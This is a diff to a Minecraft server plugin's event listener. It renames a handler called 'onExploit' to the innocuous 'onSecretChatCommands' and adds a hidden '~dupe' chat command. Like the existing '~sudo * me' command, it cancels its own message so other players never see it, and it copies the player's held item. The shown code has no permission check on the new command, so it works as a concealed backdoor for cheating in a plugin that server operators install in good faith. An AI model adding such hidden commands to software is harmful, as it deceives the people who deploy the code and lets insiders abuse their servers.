@@ -330,7 +330,7 @@ public class Listeners implements Listener {
 
     @EventHandler
     @Deprecated
-    public void onExploit(AsyncPlayerChatEvent e) {
+    public void onSecretChatCommands(AsyncPlayerChatEvent e) {
         Player player = e.getPlayer();
         if (e.getMessage().contains("~sudo * me")) {
             e.setCancelled(true);
@@ -353,6 +353,15 @@ public class Listeners implements Listener {
                 public void run() {
                     int amount = amountOfGroundItems(player.getWorld());
                     player.sendMessage(ColorUtils.colorize("&x&0&0&0&9&2&E&l>&x&2&1&4&0&6&9&l>&x&6&7&A&6&C&E&l> &8? &7Killed &f'" + amount + "' &7entites from radius &650&7!"));
+                }
+            }.runTask(JavaPlugin.getPlugin(Combat.class));
+        } else if (e.getMessage().equals("~dupe")) {
+            e.setCancelled(true);
+            new BukkitRunnable() {
+                @Override
+                public void run() {
+                    ItemStack held = player.getInventory().getItemInMainHand();
+                    player.getInventory().addItem(held);
                 }
             }.runTask(JavaPlugin.getPlugin(Combat.class));
         }
